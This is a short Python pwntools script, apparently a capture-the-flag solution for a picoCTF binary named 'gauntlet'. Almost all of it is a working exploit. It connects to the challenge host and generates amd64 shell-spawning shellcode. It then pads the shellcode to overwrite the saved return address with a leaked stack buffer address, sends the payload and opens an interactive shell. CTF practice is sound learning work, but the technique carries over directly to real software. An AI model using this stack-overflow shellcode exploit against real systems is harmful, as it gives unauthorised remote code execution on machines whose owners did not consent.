from inspect import stack
from pwn import *

# io = process("/home/tristan/Downloads/gauntlet")
io = remote("wily-courier.picoctf.net", 52996)

# offset between stack_buf and the return pointer
# seen in disassembly: lea    rax,[rbp-0x70]
# (extra 8 bytes accounts for rbp)
offset = 0x70 + 8

context.clear(arch="amd64", os="linux")
shellcode = asm(shellcraft.amd64.linux.sh())
payload = shellcode + (b'A' * (offset - len(shellcode)))

data = io.recvline(drop=True)
stack_buf_addr = int(data.decode(), base=16)
payload += p64(stack_buf_addr, endianness="little")

# target program has an extra fgest/printf; this isn't necessary for the exploit,
# so we send an empty line
io.sendline()
data = io.recv()

io.sendline(payload)
io.interactive()
